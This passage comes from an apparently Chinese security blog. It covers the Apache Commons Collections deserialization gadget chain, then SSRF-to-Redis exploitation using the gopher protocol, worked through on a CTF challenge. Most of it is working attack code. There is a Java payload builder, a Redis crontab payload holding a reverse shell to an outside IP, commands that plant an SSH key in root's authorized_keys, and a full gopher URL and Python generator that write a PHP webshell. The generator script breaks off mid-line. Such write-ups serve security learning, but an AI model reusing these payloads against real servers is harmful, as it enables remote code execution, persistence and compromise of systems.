class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.服务器调用readObject反序列化构造好的ChainedChainedTransformer</span><br><span class="line">2.调用反序列化后的ChainedTransformer类中的transform方法执行命令</span><br></pre></td></tr></table></figure><p>代码如下，实际环境中基本不可能满足这两个条件，因此我们需要寻找其他触发方式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把构造好的数组封装成ChainedTransformer</span></span><br><span class="line">        ChainedChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化数据</span></span><br><span class="line">        FileOutputStream fileOutputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化数据</span></span><br><span class="line">        FileInputStream fileInputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用反序列化后的ChainedTransformer类中的transform方法触发</span></span><br><span class="line">        ChainedTransformer SerialChainTransformer=(ChainedTransformer)objectInputStream.readObject();</span><br><span class="line">        SerialChainTransformer.transform(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="绑定Map和转换链"><a href="#绑定Map和转换链" class="headerlink" title="绑定Map和转换链"></a>绑定Map和转换链</h2><p>之前我们把构造好的Transformer数组封装成了一个ChainedTransformer，它实质上是一个转换链，而TransformerMap类的构造函数可以绑定map和转换链，只要在map中添加数据就会自动调用这个转换链，执行payload，这样降低了触发的难度</p><p><code>org.apache.commons.collections.map.TransformedMap</code></p><p>TransformedMap类的功能是存储键值对并将其转换为transform objects，<code>decorate</code>方法可创建键值对组，用于绑定map和转换链</p><p><img src="https://www.hualigs.cn/image/608bc03242581.jpg"></p><p>代码实例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Commons_collections_Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//根据transform的执行规则，InvokeTransformer类构造函数的第一个参数为要执行的，第二个参数为一个Class[]，包含了要获取方法的参数类型。第三个参数为invoke的第二个参数</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//把构造好的数组封装成ChainedTransformer</span></span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap=<span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Map map=TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化map</span></span><br><span class="line">        FileOutputStream fileOutputStream=<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream=<span class="keyword">new</span> ObjectOutputStream(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(map);</span><br><span class="line"></span><br><span class="line">        FileInputStream fileInputStream=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;payload.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> ObjectInputStream(fileInputStream);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Map UnserializedMap=(Map)objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//只要修改Map的值就会触发转换链，执行payload</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//向Map中添加新值</span></span><br><span class="line">        <span class="comment">//UnserializedMap.put(&quot;123&quot;,&quot;123&quot;);</span></span><br><span class="line">        <span class="comment">//修改键值</span></span><br><span class="line">        Map.Entry entry  = (Map.Entry) UnserializedMap.entrySet().iterator().next();</span><br><span class="line">        entry.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在触发条件变成了经过迭代器迭代调用<code>setValue</code>函数修改<code>Map</code>值来触发漏洞，继续寻找调用了<code>setValue</code>的地方</p><h2 id="AnnotationInvocationHandler的readObject复写点"><a href="#AnnotationInvocationHandler的readObject复写点" class="headerlink" title="AnnotationInvocationHandler的readObject复写点"></a>AnnotationInvocationHandler的readObject复写点</h2><p>jdk1.7中有一个存在readobject复写点的类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>。java在反序列化中会优先调用复写的readObject</p><p><code>AnnotationInvocationHandler</code>构造函数</p><p><img src="https://www.hualigs.cn/image/608bc03252278.jpg"></p><p>存在<code>setValue</code>，触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6))); <span class="comment">//存在setValue</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ssrf中gopher+redis的利用总结</title>
    <link href="/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>只能在Centos上使用，原因：</p><p>1.redis默认写入文件的权限为644，而ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600，否则会报错。而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也可执行。</p><p>2.因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</p><p>3.不同系统中crontrab定时文件位置也会不同Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code>，Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> ，高版本的redis默认启动是<code>redis</code>权限，所以无法利用。</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set xxx &quot;\n\n* * * * * bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.133.164.81&#x2F;6666 0&gt;&amp;1\n\n&quot;</span><br><span class="line">config set dir &#x2F;var&#x2F;spool&#x2F;cron</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h1><p>向/root/.ssh中写入公钥即可用ssh登陆服务器，高版本redis少有root权限，难以利用</p><p>生成私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>redis命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">set 1 &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGd9qrfBQqsml+aGC&#x2F;PoXsKGFhW3sucZ81fiESpJ+HSk1ILv+mhmU2QNcopiPiTu+kGqJYjIanrQEFbtL+NiWaAHahSO3cgPYXpQ+lW0FQwStEHyDzYOM3Jq6VMy8PSPqkoIBWc7Gsu6541NhdltPGH202M7PfA6fXyPR&#x2F;BSq30ixoAT1vKKYMp8+8&#x2F;eyeJzDSr0iSplzhKPkQBYquoiyIs70CTp7HjNwsE2lKf4WV8XpJm7DHSnnnu+1kqJMw0F&#x2F;3NqhrxYK8KpPzpfQNpkAhKCozhOwH2OdNuypyrXPf3px06utkTp6jvx3ESRfJ89jmuM9y4WozM3dylOwMWjal root@kali</span><br><span class="line">&#39;</span><br><span class="line">config set dir &#x2F;root&#x2F;.ssh&#x2F;</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h1 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h1><p>比较常用的方法，以[网鼎杯 2020 玄武组]SSRFMe为例</p><p>访问index.php，过滤127.0.0.1，使用<code>http://0.0.0.0</code>绕过，提示要访问hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=preg_match(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=gethostbyname(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=ip2long(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> ip2long(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_inner_ip(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = curl_getinfo(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            safe_request_url(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">        var_dump(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        safe_request_url(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>读取hint.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;http:&#x2F;&#x2F;0.0.0.0&#x2F;hint.php</span><br></pre></td></tr></table></figure><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">  file_put_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">&quot; </span></span><br></pre></td></tr></table></figure><p>利用<code>dict://</code>访问6379端口，存在redis，前面给出了密码为root</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn&#x2F;?url&#x3D;dict:&#x2F;&#x2F;0.0.0.0:6379</span><br></pre></td></tr></table></figure><p><img src="https://www.hualigs.cn/image/6086b21e53d31.jpg"></p><p>利用gopher协议，生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell\Desktop</span><br><span class="line">&gt; python2 G:\工具\ssrf工具\gopherwriteshell2.py</span><br><span class="line">gopher:&#x2F;&#x2F;0.0.0.0:6379&#x2F;_%2A2%0D%0A%244%0D%0AAUTH%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20&#x2F;flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure><p>python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;10.0.231.11&quot;</span>      // 运行有redis的主机ip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line"> <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line"> <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line"> <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line"> <span class="string">&quot;save&quot;</span></span><br><span class="line"> ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span 